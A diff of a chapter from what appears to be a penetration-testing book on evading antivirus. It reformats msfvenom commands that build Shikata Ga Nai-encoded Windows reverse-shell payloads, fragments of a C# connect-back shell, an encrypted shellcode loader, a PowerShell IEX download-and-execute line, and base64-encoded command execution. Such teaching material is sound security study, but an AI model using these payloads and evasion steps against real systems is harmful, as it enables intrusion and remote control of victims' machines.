@@ -86,7 +86,8 @@ One of the best known of these is the encoder called "Shikata Ga Nai". Technical
 
 ```bash
 ┌─[rin@parrot]─[~/book]
-└──╼ $msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o pass2.exe
+└──╼ $msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
+LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o pass2.exe
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 381 (iteration=0)
@@ -104,7 +105,7 @@ Saved as: pass2.exe
 
 An added advantage of Shikata Ga Nai encoding is that it can be used to avoid bytes such as null bytes and carriage return or linefeed that might interfere with the transmission and execution of the shellcode.
 
-Unfortunately, if the results of this are uploaded to VirusTotal, 52 of 70 of the AVs detect it as malware \(Figure 9-1\). Increasing the number of iterations of the encoding doesn't improve the situation with 53 of the AVs detecting it as malware. Microsoft Defender even correctly identifies it as a Metasploit executable.
+Unfortunately, if the results of this are uploaded to VirusTotal, 52 of 70 of the AVs detect it as malware. Increasing the number of iterations of the encoding doesn't improve the situation with 53 of the AVs detecting it as malware. Microsoft Defender even correctly identifies it as a Metasploit executable.
 
 ![Output from VirusTotal for the reverse shell encoded with Shikata Ga Nai](../.gitbook/assets/0%20%2810%29.png)
 
@@ -137,7 +138,8 @@ namespace ConnectBack {
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.RedirectStandardError = true;
-            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            p.OutputDataReceived += 
+              new DataReceivedEventHandler(CmdOutputDataHandler);
             p.Start();
             p.BeginOutputReadLine();
             while(true) {
@@ -169,7 +171,8 @@ When run against VirusTotal, it is detected as malicious by only 10 of 60 engine
 Other techniques such as encrypting payloads and decrypting before running also may evade a specific AV but they are getting better at detecting these techniques as well. To do this, we can use msfvenom to generate a payload:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.114.2 LPORT=4445 -f csharp -o payload.txt
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.114.2 LPORT=4445 \
+-f csharp -o payload.txt
 ```
 
 To encrypt I have used an example that is on GitHub \(https://github.com/cribdragg3r/Simple-Loader\). This uses AES to encrypt the byte stream read from the payload.txt file and then generate Base64 output. This output then can be copy pasted into the program and when run without arguments, it will decrypt and copy the output into memory created using a VirtualAlloc call. This memory is then used as an argument to CreateThread which executes it:
@@ -228,8 +231,10 @@ PS C:\Users\rin\book> cat .\runme.ps1
 Write-Host
 Verify me!
 PS C:\Users\rin\book> .\runme.ps1
-.\runme.ps1 : File C:\Users\oztechmuse\rin\runme.ps1 cannot be loaded because running scripts is disabled on
-this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+.\runme.ps1 : File C:\Users\oztechmuse\rin\runme.ps1 cannot be loaded 
+because running scripts is disabled on
+this system. For more information, see about_Execution_Policies 
+at https:/go.microsoft.com/fwlink/?LinkID=135170.
 At line:1 char:1
 + .\runme.ps1
 + ~~~~~~~~~~~
@@ -258,7 +263,7 @@ Verify me!
 Download the script from a web server and execute using Invoke Expression
 
 ```bash
-PS C:\Users\rin\book> IEX(New-Object Net.WebClient).downloadString("http://192.168.114.2:8001/runme.ps1");
+IEX(New-Object Net.WebClient).downloadString("http://192.168.114.2/runme.ps1");
 Verify me!
 ```
 
@@ -269,7 +274,8 @@ PS C:\Users\rin\book> $command = "Write-Host 'Verify me!'"
 PS C:\Users\rin\book> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 PS C:\Users\rin\book> $encodedCommand = [Convert]::ToBase64String($bytes)
 PS C:\Users\rin\book> $encodedCommand
-VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
+VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABh
+AHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
 PS C:\Users\rin\book> powershell -Enc $encodedCommand
 My voice is my passport, verify me.
 ```
